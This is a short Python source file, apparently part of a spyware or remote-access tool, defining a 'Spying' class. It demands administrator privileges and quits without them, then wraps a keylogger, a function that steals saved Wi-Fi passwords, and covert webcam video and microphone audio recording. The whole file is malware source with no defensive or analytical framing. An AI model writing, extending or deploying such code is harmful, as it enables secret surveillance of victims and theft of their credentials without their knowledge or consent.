from KeyLogger import KeyLogger
from Wifi import steal_passwords
import admin
from video import VideoRecorder, AudioRecorder


class Spying:
    def __init__(self):
        if not admin.make_admin():
            exit()
        self.keyLogger = None
        self.video_recorder = None
        self.audio_recorder = None

    @staticmethod
    def steal_passwords():
        return steal_passwords()

    def start_keylogger(self):
        self.keyLogger = KeyLogger()
        self.keyLogger.start()

    def stop_keylogger(self):
        self.keyLogger.stop()

    def start_video_audio_record(self, filename):
        self.video_recorder = VideoRecorder()
        self.audio_recorder = AudioRecorder()
        self.video_recorder.start()
        self.audio_recorder.start()

    def start_video_recording(self, filename=None):
        self.video_recorder = VideoRecorder(filename) if filename else VideoRecorder()
        self.video_recorder.start()

    def start_audio_recording(self, filename=None):
        self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
        self.audio_recorder.start()
